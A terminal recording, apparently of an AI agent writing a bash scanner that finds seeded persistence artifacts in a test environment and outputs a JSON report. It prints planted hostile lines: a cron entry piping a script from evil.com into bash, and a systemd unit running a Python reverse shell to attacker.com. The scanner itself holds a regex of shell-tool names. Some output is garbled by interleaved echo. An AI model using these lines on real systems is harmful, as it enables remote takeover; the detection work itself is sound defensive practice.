@@ -1,0 +1,1689 @@
+[?2004hroot@0d5a608a53ec:/app# asciinema rec --stdin /logs/agent/recording.cast
+[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
+[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
+[?2004hroot@0d5a608a53ec:/app# clear
+[?2004l[H[J[?2004hroot@0d5a608a53ec:/app# ls -la /app /app_target 2>&1; echo '---'; ls -la /etc/cron.d /etc/systemd/system /usr/lib/systemd/system /run/systemd/system 2>&1 | head -100; echo '---'; ls -la /etc/rc.local /etc/rc.d/rc.local /etc/crontab 2>&1; echo '---'; ls -la /home/*/.ssh /root/.ssh 2>&1; echo '---'; ls -la /var/spool/cron/crontabs 2>&1
+[?2004l/app:
+total 8
+drwxr-xr-x 2 root root 4096 Oct 25 21:37 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 26 01:28 [01;34m..[0m
+
+/app_target:
+total 20
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 [01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 26 01:28 [01;34m..[0m
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 [01;34metc[0m
+drwxr-xr-x 3 root root 4096 Oct 25 21:38 [01;34mhome[0m
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [01;34mscripts[0m
+---
+ls: cannot access '/run/systemd/system': No such file or directory
+/etc/cron.d:
+total 20
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 .
+drwxr-xr-x 1 root root 4096 Oct 26 01:28 ..
+-rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
+-rw-r--r-- 1 root root   89 Oct 25 21:38 backdoor_cron
+-rw-r--r-- 1 root root  202 Jan  8  2022 e2scrub_all
+
+/etc/systemd/system:
+total 28
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 .
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 ..
+lrwxrwxrwx 1 root root   44 Oct 25 21:38 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
+lrwxrwxrwx 1 root root   45 Oct 25 21:38 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 getty.target.wants
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 multi-user.target.wants
+-rw-r--r-- 1 root root  225 Oct 25 21:38 persistence.service
+lrwxrwxrwx 1 root root   31 Oct 25 21:38 sshd.service -> /lib/systemd/system/ssh.service
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 sysinit.target.wants
+drwxr-xr-x 2 root root 4096 Sep 30 02:08 timers.target.wants
+
+/usr/lib/systemd/system:
+total 796
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 .
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 ..
+-rw-r--r-- 1 root root  256 Oct 25 21:38 .hidden_service.service
+-rw-r--r-- 1 root root  389 Oct 22  2024 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Oct 22  2024 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  326 Oct 22  2024 apt-daily.service
+-rw-r--r-- 1 root root  156 Oct 22  2024 apt-daily.timer
+lrwxrwxrwx 1 root root   14 Oct 12 07:44 autovt@.service -> getty@.service
+-rw-r--r-- 1 root root  927 Mar 11  2022 basic.target
+-rw-r--r-- 1 root root  449 Mar 11  2022 blockdev@.target
+-rw-r--r-- 1 root root  435 Mar 11  2022 bluetooth.target
+-rw-r--r-- 1 root root  463 Mar 11  2022 boot-complete.target
+-rw-r--r-- 1 root root 1073 Oct 12 07:44 console-getty.service
+-rw-r--r-- 1 root root 1254 Oct 12 07:44 container-getty@.service
+-rw-r--r-- 1 root root  319 Mar 17  2021 cron.service
+lrwxrwxrwx 1 root root    9 Oct 12 07:44 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Oct 12 07:44 cryptdisks.service -> /dev/null
+-rw-r--r-- 1 root root  473 Mar 11  2022 cryptsetup-pre.target
+-rw-r--r-- 1 root root  420 Mar 11  2022 cryptsetup.target
+lrwxrwxrwx 1 root root   13 Oct 12 07:44 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Oct 12 07:44 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Oct 12 07:44 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Oct 12 07:44 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   25 Oct 12 07:44 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+-rw-r--r-- 1 root root  498 Oct 25  2022 dbus.service
+-rw-r--r-- 1 root root  193 Oct 25  2022 dbus.socket
+-rw-r--r-- 1 root root 1065 Oct 12 07:44 debug-shell.service
+lrwxrwxrwx 1 root root   16 Oct 12 07:44 default.target -> graphical.target
+-rw-r--r-- 1 root root  758 Mar 11  2022 dev-hugepages.mount
+-rw-r--r-- 1 root root  701 Mar 11  2022 dev-mqueue.mount
+-rw-r--r-- 1 root root  147 Dec  5  2021 dpkg-db-backup.service
+-rw-r--r-- 1 root root  138 Dec  5  2021 dpkg-db-backup.timer
+-rw-r--r-- 1 root root  438 Oct  9  2023 e2scrub@.service
+-rw-r--r-- 1 root root  297 Oct  9  2023 e2scrub_all.service
+-rw-r--r-- 1 root root  251 Oct  9  2023 e2scrub_all.timer
+-rw-r--r-- 1 root root  246 Oct  9  2023 e2scrub_fail@.service
+-rw-r--r-- 1 root root  553 Oct  9  2023 e2scrub_reap.service
+-rw-r--r-- 1 root root  805 Oct 12 07:44 emergency.service
+-rw-r--r-- 1 root root  479 Mar 11  2022 emergency.target
+-rw-r--r-- 1 root root  549 Mar 11  2022 exit.target
+-rw-r--r-- 1 root root  500 Mar 11  2022 final.target
+-rw-r--r-- 1 root root  461 Mar 11  2022 first-boot-complete.target
+-rw-r--r-- 1 root root  477 Aug 19 17:43 fstrim.service
+-rw-r--r-- 1 root root  270 Aug 19 17:43 fstrim.timer
+-rw-r--r-- 1 root root  517 Mar 11  2022 getty-pre.target
+-rw-r--r-- 1 root root  366 Mar 24  2026 getty-static.service
+-rw-r--r-- 1 root root  508 Mar 11  2022 getty.target
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 getty.target.wants
+-rw-r--r-- 1 root root 1966 Oct 12 07:44 getty@.service
+-rw-r--r-- 1 root root  606 Mar 11  2022 graphical.target
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 graphical.target.wants
+-rw-r--r-- 1 root root  542 Mar 11  2022 halt.target
+-rw-r--r-- 1 root root  526 Mar 11  2022 hibernate.target
+lrwxrwxrwx 1 root root    9 Oct 12 07:44 hwclock.service -> /dev/null
+-rw-r--r-- 1 root root  538 Mar 11  2022 hybrid-sleep.target
+-rw-r--r-- 1 root root  670 Mar 11  2022 initrd-cleanup.service
+-rw-r--r-- 1 root root  598 Mar 11  2022 initrd-fs.target
+-rw-r--r-- 1 root root  820 Mar 11  2022 initrd-parse-etc.service
+-rw-r--r-- 1 root root  566 Mar 11  2022 initrd-root-device.target
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 initrd-root-device.target.wants
+-rw-r--r-- 1 root root  571 Mar 11  2022 initrd-root-fs.target
+-rw-r--r-- 1 root root  589 Mar 11  2022 initrd-switch-root.service
+-rw-r--r-- 1 root root  779 Mar 11  2022 initrd-switch-root.target
+-rw-r--r-- 1 root root  823 Mar 11  2022 initrd-udevadm-cleanup-db.service
+-rw-r--r-- 1 root root  571 Mar 11  2022 initrd-usr-fs.target
+-rw-r--r-- 1 root root  810 Mar 11  2022 initrd.target
+-rw-r--r-- 1 root root  549 Mar 11  2022 kexec.target
+-rw-r--r-- 1 root root  701 Oct 12 07:44 kmod-static-nodes.service
+lrwxrwxrwx 1 root root   28 Oct 12 07:44 kmod.service -> systemd-modules-load.service
+-rw-r--r-- 1 root root  453 Mar 11  2022 local-fs-pre.target
+-rw-r--r-- 1 root root  555 Mar 11  2022 local-fs.target
+drwxr-xr-x 2 root root 4096 Oct 12 07:44 local-fs.target.wants
+-rw-r--r-- 1 root root  453 Mar 11  2022 machine.slice
+-rw-r--r-- 1 root root  573 Oct 12 07:44 modprobe@.service
+-rw-r--r-- 1 root root  173 Sep 10  2024 motd-news.service
+-rw-r--r-- 1 root root  161 Sep 10  2024 motd-news.timer
+---
+ls: cannot access '/etc/rc.d/rc.local': No such file or directory
+-rw-r--r-- 1 root root 1136 Mar 23  2022 /etc/crontab
+-rwxr-xr-x 1 root root   48 Oct 25 21:38 [0m[01;32m/etc/rc.local[0m
+---
+/home/testuser/.ssh:
+total 12
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [0m[01;34m.[0m
+drwxr-xr-x 3 root root 4096 Oct 25 21:38 [01;34m..[0m
+-rw-r--r-- 1 root root  115 Oct 25 21:38 authorized_keys
+
+/root/.ssh:
+total 12
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [01;34m.[0m
+drwx------ 1 root root 4096 Oct 26 01:28 [01;34m..[0m
+-rw-r--r-- 1 root root  129 Oct 25 21:38 authorized_keys
+---
+total 12
+drwx-wx--T 1 root crontab 4096 Oct 25 21:38 [0m[37;44m.[0m
+drwxr-xr-x 1 root root    4096 Oct 25 21:38 [01;34m..[0m
+-rw-r--r-- 1 root root      77 Oct 25 21:38 root
+[?2004hroot@0d5a608a53ec:/app# find /app_target -maxdepth 4 -printf '%M %u %s %p\n' 2>/dev/null | head -200; echo '--- backdoor_cron'; cat -A /etc/cron.d/backdoor_cron; echo '--- e2scrub_all'; cat /etc/cron.d/e2scrub_all; echo '--- spool root'; cat -A /var/spool/cron/crontabs/root; echo '--- rc.local'; cat -A /etc/rc.local; echo '--- persistence.service'; cat /etc/systemd/system/persistence.service; echo '--- hidden_service'; cat /usr/lib/systemd/system/.hidden_service.service; echo '--- testuser keys'; cat -A /home/testuser/.ssh/authorized_keys; echo '--- root keys'; cat -A /root/.ssh/authorized_keys
+[?2004ldrwxr-xr-x root 4096 /app_target
+drwxr-xr-x root 4096 /app_target/scripts
+-rw-r--r-- root 0 /app_target/scripts/evil.sh
+drwxr-xr-x root 4096 /app_target/etc
+-rwxr-xr-x root 81 /app_target/etc/rc.local
+drwxr-xr-x root 4096 /app_target/etc/cron.d
+-rw-r--r-- root 43 /app_target/etc/cron.d/app_cron
+drwxr-xr-x root 4096 /app_target/etc/systemd
+drwxr-xr-x root 4096 /app_target/etc/systemd/system
+-rw-r--r-- root 121 /app_target/etc/systemd/system/app_backdoor.service
+drwxr-xr-x root 4096 /app_target/home
+drwxr-xr-x root 4096 /app_target/home/victim
+drwxr-xr-x root 4096 /app_target/home/victim/.ssh
+-rw-r--r-- root 46 /app_target/home/victim/.ssh/authorized_keys
+--- backdoor_cron
+* * * * * root /tmp/malicious_cron.sh$
+0 2 * * * user /usr/local/bin/suspicious_backup.sh$
+--- e2scrub_all
+30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/aarch64-linux-gnu/e2fsprogs/e2scrub_all_cron
+10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
+--- spool root
+# Malicious cron entry$
+*/5 * * * * curl -s http://evil.com/payload.sh | bash$
+--- rc.local
+#!/bin/bash$
+# Standard rc.local content$
+exit 0$
+$
+--- persistence.service
+[Unit]
+Description=System Persistence Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c "while true; do /tmp/.hidden_backdoor.sh; sleep 60; done"
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
+--- hidden_service
+[Unit]
+Description=Hidden Service
+[Service]
+ExecStart=/usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+
+--- testuser keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...$
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8... attacker@unknown$
+--- root keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...$
+# Legitimate key$
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... malicious@backdoor$
+[?2004hroot@0d5a608a53ec:/app# cat > /app/scan_persistence.sh <<'EOF'
+[?2004l[?2004h> #!/bin/bash
+[?2004l[?2004h> # scan_persistence.sh - read-only scanner for seeded persistence artifacts
+[?2004l[?2004h> export LC_ALL=C
+[?2004l[?2004h> 
+[?2004l[?2004h> OUT=/app/persistence_report.json
+[?2004l[?2004h> SEP=$'\x1f'
+[?2004l[?2004h> RECORDS=""
+[?2004l[?2004h> KNOWN_KEYS_FILE=/app/known_ssh_keys.txt
+[?2004l[?2004h> declare -A SEEN=()
+[?2004l[?2004h> declare -A KNOWN=()
+[?2004l[?2004h> 
+[?2004l[?2004h> SUSP_RE='/tmp|/var/tmp|/dev/shm|base64|eval|curl|wget|/dev/tcp|mkfifo|ncat|netcat|bash -i|sh -i|python[0-9.]* -c|perl -e|[|] *(ba|z)?sh'
+[?2004l[?2004h> 
+[?2004l[?2004h> if [[ -r $KNOWN_KEYS_FILE ]]; then
+[?2004l[?2004h>   while IFS= read -r k || [[ -n $k ]]; do
+[?2004l[?2004h>     [[ -n $k ]] && KNOWN["$k"]=1
+[?2004l[?2004h>   done < "$KNOWN_KEYS_FILE"
+[?2004l[?2004h> fi
+[?2004l[?2004h> 
+[?2004la}${SEP}${line:-null}${SEP}${preview}${SEP}${user}"$'\n'
+}
+
+resolve() {
+  local r
+  r=$(readlink -f -- "$1" 2>/dev/null) || return 1
+  [[ -n $r && -f $r && -r $r ]] || return 1
+  printf '%s' "$r"
+}
+
+seen_once() {
+  local key="$1|$2"
+  [[ -n ${SEEN[$key]:-} ]] && return 1
+  SEEN[$key]=1
+  return 0
+}
+
+is_every_minute() {
+  [[ $1 =~ ^([*]|[*]/1)([[:space:]]+([*]|[*]/1)){4}([[:space:]]|$) ]]
+}
+
+is_suspicious() {
+  local t=$1 tok
+  local -a toks
+  grep -Eqi -- "$SUSP_RE" <<< "$t" && return 0
+  read -ra toks <<< "$t"
+  for tok in "${toks[@]}"; do
+    case $tok in
+      /*)
+        case $tok in
+          /usr/bin/*|/bin/*|/sbin/*|/usr/sbin/*|/usr/lib/*|/usr/libexec/*|/lib/*|/etc/*|/run/systemd/*|/dev/null|/proc/*|/sys/*|/) ;;
+          *) return 0 ;;
+        esac ;;
+    esac
+  done
+  return 1
+}
+
+scan_cron_file() {
+  local f=$1 spool=0 n=0 line t user idx
+  local -a F
+  [[ $f == */spool/cron/* ]] && spool=1
+  while IFS= read -r line || [[ -n $line ]]; do
+    n=$((n+1))
+    t=${line#"${line%%[![:space:]]*}"}
+    [[ -z $t || $t == "#"* ]] && continue
+    [[ $t =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] && continue
+    user=""
+    if (( spool )); then
+      user=$(basename -- "$f")
+    else
+      read -ra F <<< "$t"
+      idx=5
+      [[ ${F[0]} == @* ]] && idx=1
+      [[ -n ${F[$idx]:-} ]] && user=${F[$idx]}
+    fi
+    if is_every_minute "$t" || is_suspicious "$t"; then
+      add_record cron_job "$f" "$n" "$t" "$user"
+    fi
+  done < "$f" 2>/dev/null
+}
+
+scan_systemd_file() {
+  local f=$1 base hidden=0 n=0 text value hitline="" hittext="" preview
+  base=$(basename -- "$f")
+  [[ $base == .* ]] && hidden=1
+  while IFS= read -r text || [[ -n $text ]]; do
+    n=$((n+1))
+    if [[ $text =~ ^[[:space:]]*Exec(Start|StartPre|StartPost|Stop)?[[:space:]]*= ]]; then
+      value=${text#*=}
+      value=${value#"${value%%[![:space:]]*}"}
+      value=${value#-}
+      if [[ -z $hitline ]] && is_suspicious "$value"; then
+        hitline=$n
+        hittext=$text
+      fi
+    fi
+  done < "$f" 2>/dev/null
+  if (( hidden )) || [[ -n $hitline ]]; then
+    if [[ -n $hitline ]]; then
+      preview=$hittext
+    else
+      preview="hidden unit file: $base"
+    fi
+    add_record systemd_unit "$f" "$hitline" "$preview" ""
+  fi
+}
+
+scan_rclocal_file() {
+  local f=$1 n=0 line t
+  while IFS= read -r line || [[ -n $line ]]; do
+    n=$((n+1))
+    t=${line#"${line%%[![:space:]]*}"}
+    t=${t%"${t##*[![:space:]]}"}
+    [[ -z $t || $t == "#"* || $t == "exit 0" ]] && continue
+    add_record rc_local "$f" "$n" "$t" ""
+  done < "$f" 2>/dev/null
+}
+
+scan_ssh_file() {
+  local f=$1 n=0 line t user=root
+  if [[ $f =~ /home/([^/]+)/[.]ssh/authorized_keys$ ]]; then
+    user=${BASH_REMATCH[1]}
+  fi
+  while IFS= read -r line || [[ -n $line ]]; do
+    n=$((n+1))
+    t=${line#"${line%%[![:space:]]*}"}
+    t=${t%"${t##*[![:space:]]}"}
+    [[ -z $t || $t == "#"* ]] && continue
+    [[ -n ${KNOWN[$t]:-} ]] && continue
+    add_record ssh_key "$f" "$n" "$t" "$user"
+  done < "$f" 2>/dev/null
+}
+
+walk_dir() {
+  local d=$1 cb=$2 e r
+  while IFS= read -r -d '' e; do
+    r=$(resolve "$e") || continue
+ [?2004h> json_escape() {
+[?2004l[?2004h>   local s=$1
+[?2004l[?2004h>   s=${s//\\/\\\\}
+[?2004l[?2004h>   s=${s//\"/\\\"}
+[?2004l[?2004h>   printf '%s' "$s"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> clean() {
+[?2004l[?2004h>   local s
+[?2004l[?2004h>   s=$(printf '%s' "$1" | tr -d '[:cntrl:]')
+[?2004l[?2004h>   s=${s#"${s%%[![:space:]]*}"}
+[?2004l[?2004h>   s=${s%"${s##*[![:space:]]}"}
+[?2004l[?2004h>   printf '%s' "${s:0:100}"
+[?2004l[?2004h> }
+[?2004lc/[?2004h> 
+[?2004l[?2004h> add_record() {
+[?2004llocal /app_ta[?2004h>   local type=$1 path=$2 line=$3 preview user=$5 sha
+[?2004l[?2004h>   preview=$(clean "$4")
+[?2004l[?2004h>   sha=$(sha256sum -- "$path" 2>/dev/null | awk '{print $1}')
+[?2004l[?2004h>   [[ -z $sha ]] && return 0
+[?2004l[?2004h>   RECORDS+="${type}${SEP}${path}${SEP}${sha}${SEP}${line:-null}${SEP}${preview}${SEP}${user}"$'\n'
+[?2004l[?2004h> }
+[?2004l$S[?2004h> 
+[?2004l[?2004h> resolve() {
+[?2004l[?2004h>   local r
+[?2004l[?2004h>   r=$(readlink -f -- "$1" 2>/dev/null) || return 1
+[?2004l[?2004h>   [[ -n $r && -f $r && -r $r ]] || return 1
+[?2004l[?2004h>   printf '%s' "$r"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l$[?2004h> seen_once() {
+[?2004l[?2004h>   local key="$1|$2"
+[?2004l[?2004h>   [[ -n ${SEEN[$key]:-} ]] && return 1
+[?2004l [?2004h>   SEEN[$key]=1
+[?2004l[?2004h>   return 0
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> is_every_minute() {
+[?2004l[?2004h>   [[ $1 =~ ^([*]|[*]/1)([[:space:]]+([*]|[*]/1)){4}([[:space:]]|$) ]]
+[?2004l[?2004h> }
+[?2004lss[?2004h> 
+[?2004l[?2004h> is_suspicious() {
+[?2004l[?2004h>   local t=$1 tok
+[?2004l  esac
+  lj=$lin[?2004h>   local -a toks
+[?2004l[?2004h>   grep -Eqi -- "$SUSP_RE" <<< "$t" && return 0
+[?2004l[?2004h>   read -ra toks <<< "$t"
+[?2004l[?2004h>   for tok in "${toks[@]}"; do
+[?2004l[?2004h>     case $tok in
+[?2004l[?2004h>       /*)
+[?2004l[?2004h>         case $tok in
+[?2004l[?2004h>           /usr/bin/*|/bin/*|/sbin/*|/usr/sbin/*|/usr/lib/*|/usr/libexec/*|/lib/*|/etc/*|/run/systemd/*|/dev/null|/proc/*|/sys/*|/) ;;
+[?2004l[?2004h>           *) return 0 ;;
+[?2004l[?2004h>         esac ;;
+[?2004l[?2004h>     esac
+[?2004l"$type" "$(json_escape "$[?2004h>   done
+[?2004l[?2004h>   return 1
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_cron_file() {
+[?2004l[?2004h>   local f=$1 spool=0 n=0 line t user idx
+[?2004l[?2004h>   local -a F
+[?2004l$item
+done <<[?2004h>   [[ $f == */spool/cron/* ]] && spool=1
+[?2004lummary":[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l %d,\n    "syst[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ $t =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] && continue
+[?2004l[?2004h>     user=""
+[?2004lc_ssh"
+  if [?2004h>     if (( spool )); then
+[?2004l  [?2004h>       user=$(basename -- "$f")
+[?2004l[?2004h>     else
+[?2004l[?2004h>       read -ra F <<< "$t"
+[?2004l[?2004h>       idx=5
+[?2004l[?2004h>       [[ ${F[0]} == @* ]] && idx=1
+[?2004l[?2004h>       [[ -n ${F[$idx]:-} ]] && user=${F[$idx]}
+[?2004lce.sh && ech[?2004h>     fi
+[?2004lo 'scri[?2004h>     if is_every_minute "$t" || is_suspicious "$t"; then
+[?2004l[?2004h>       add_record cron_job "$f" "$n" "$t" "$user"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_systemd_file() {
+[?2004l[?2004h>   local f=$1 base hidden=0 n=0 text value hitline="" hittext="" preview
+[?2004l[?2004h>   base=$(basename -- "$f")
+[?2004l[?2004h>   [[ $base == .* ]] && hidden=1
+[?2004l[?2004h>   while IFS= read -r text || [[ -n $text ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     if [[ $text =~ ^[[:space:]]*Exec(Start|StartPre|StartPost|Stop)?[[:space:]]*= ]]; then
+[?2004l[?2004h>       value=${text#*=}
+[?2004l[?2004h>       value=${value#"${value%%[![:space:]]*}"}
+[?2004l[?2004h>       value=${value#-}
+[?2004l[?2004h>       if [[ -z $hitline ]] && is_suspicious "$value"; then
+[?2004l[?2004h>         hitline=$n
+[?2004l[?2004h>         hittext=$text
+[?2004l[?2004h>       fi
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h>   if (( hidden )) || [[ -n $hitline ]]; then
+[?2004l[?2004h>     if [[ -n $hitline ]]; then
+[?2004l[?2004h>       preview=$hittext
+[?2004l[?2004h>     else
+[?2004l[?2004h>       preview="hidden unit file: $base"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>     add_record systemd_unit "$f" "$hitline" "$preview" ""
+[?2004l[?2004h>   fi
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_rclocal_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* || $t == "exit 0" ]] && continue
+[?2004l[?2004h>     add_record rc_local "$f" "$n" "$t" ""
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_ssh_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t user=root
+[?2004l[?2004h>   if [[ $f =~ /home/([^/]+)/[.]ssh/authorized_keys$ ]]; then
+[?2004l[?2004h>     user=${BASH_REMATCH[1]}
+[?2004l[?2004h>   fi
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ -n ${KNOWN[$t]:-} ]] && continue
+[?2004l[?2004h>     add_record ssh_key "$f" "$n" "$t" "$user"
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> walk_dir() {
+[?2004l[?2004h>   local d=$1 cb=$2 e r
+[?2004l[?2004h>   while IFS= read -r -d '' e; do
+[?2004l[?2004h>     r=$(resolve "$e") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done < <(find "$d" -mindepth 1 -maxdepth 1 -print0 2>/dev/null | sort -z)
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list() {
+[?2004l[?2004h>   local cb=$1 p r
+[?2004l[?2004h>   shift
+[?2004l[?2004h>   for p in "$@"; do
+[?2004l[?2004h>     r=$(resolve "$p") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/cron.d /var/spool/cron/crontabs /app_target/etc/cron.d /app_target/var/spool/cron/crontabs; do
+[?2004l[?2004h>   walk_dir "$d" scan_cron_file
+[?2004l[?2004h> done
+[?2004l[?2004h> scan_file_list scan_cron_file /etc/crontab /app_target/etc/crontab
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/systemd/system /usr/lib/systemd/system /run/systemd/system /app_target/etc/systemd/system /app_target/usr/lib/systemd/system /app_target/run/systemd/system; do
+[?2004l[?2004h>   walk_dir "$d" scan_systemd_file
+[?2004l[?2004h> done
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list scan_rclocal_file /etc/rc.local /etc/rc.d/rc.local /app_target/etc/rc.local /app_target/etc/rc.d/rc.local
+[?2004l[?2004h> scan_file_list scan_ssh_file /root/.ssh/authorized_keys /app_target/root/.ssh/authorized_keys /home/*/.ssh/authorized_keys /app_target/home/*/.ssh/authorized_keys
+[?2004l[?2004h> 
+[?2004l[?2004h> mkdir -p /app
+[?2004l[?2004h> TMP="${OUT}.tmp.$$"
+[?2004l[?2004h> SORTED=$(printf '%s' "$RECORDS" | sort -t "$SEP" -k1,1 -k2,2)
+[?2004l[?2004h> total=0; c_cron=0; c_sys=0; c_rc=0; c_ssh=0
+[?2004l[?2004h> items=""
+[?2004l[?2004h> while IFS="$SEP" read -r type path sha line preview user; do
+[?2004l[?2004h>   [[ -z $type ]] && continue
+[?2004l[?2004h>   total=$((total + 1))
+[?2004l[?2004h>   case $type in
+[?2004l[?2004h>     cron_job) c_cron=$((c_cron + 1)) ;;
+[?2004l[?2004h>     systemd_unit) c_sys=$((c_sys + 1)) ;;
+[?2004l[?2004h>     rc_local) c_rc=$((c_rc + 1)) ;;
+[?2004l[?2004h>     ssh_key) c_ssh=$((c_ssh + 1)) ;;
+[?2004l[?2004h>   esac
+[?2004l[?2004h>   lj=$line
+[?2004l[?2004h>   [[ -z $lj || $lj == null ]] && lj=null
+[?2004l[?2004h>   uj=null
+[?2004l[?2004h>   [[ -n $user ]] && uj=$(printf '"%s"' "$(json_escape "$user")")
+[?2004l[?2004h>   item=$(printf '    {\n      "type": "%s",\n      "path": "%s",\n      "sha256": "%s",\n      "details": {\n        "line_number": %s,\n        "content_preview": "%s",\n        "user": %s\n      }\n    }' "$type" "$(json_escape "$path")" "$sha" "$lj" "$(json_escape "$preview")" "$uj")
+[?2004l[?2004h>   items+=${items:+,$'\n'}$item
+[?2004l[?2004h> done <<< "$SORTED"
+[?2004l[?2004h> 
+[?2004l[?2004h> {
+[?2004l[?2004h>   printf '{\n  "summary": {\n    "total_artifacts": %d,\n    "cron_jobs": %d,\n    "systemd_units": %d,\n    "rc_local_modifications": %d,\n    "ssh_keys": %d\n  },\n  "artifacts": [' "$total" "$c_cron" "$c_sys" "$c_rc" "$c_ssh"
+[?2004l[?2004h>   if [[ -n $items ]]; then
+[?2004l[?2004h>     printf '\n%s\n  ]\n}\n' "$items"
+[?2004l[?2004h>   else
+[?2004l[?2004h>     printf ']\n}\n'
+[?2004l[?2004h>   fi
+[?2004l[?2004h> } > "$TMP"
+[?2004l[?2004h> mv -f "$TMP" "$OUT" 2>/dev/null
+[?2004l[?2004h> exit 0
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@0d5a608a53ec:/app# chmod +x /app/scan_persistence.sh && echo 'script written'
+[?2004lscript written
+[?2004hroot@0d5a608a53ec:/app# /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; (python3 -m json.tool /app/persistence_report.json >/dev/null && echo JSON_VALID) || echo JSON_INVALID; cat /app/persistence_report.json
+[?2004lexit=0
+f32eb97a63fc1d45d7f04c5b8c710b7d  /app/persistence_report.json
+exit=0
+f32eb97a63fc1d45d7f04c5b8c710b7d  /app/persistence_report.json
+JSON_VALID
+{
+  "summary": {
+    "total_artifacts": 16,
+    "cron_jobs": 4,
+    "systemd_units": 6,
+    "rc_local_modifications": 1,
+    "ssh_keys": 5
+  },
+  "artifacts": [
+    {
+      "type": "cron_job",
+      "path": "/app_target/etc/cron.d/app_cron",
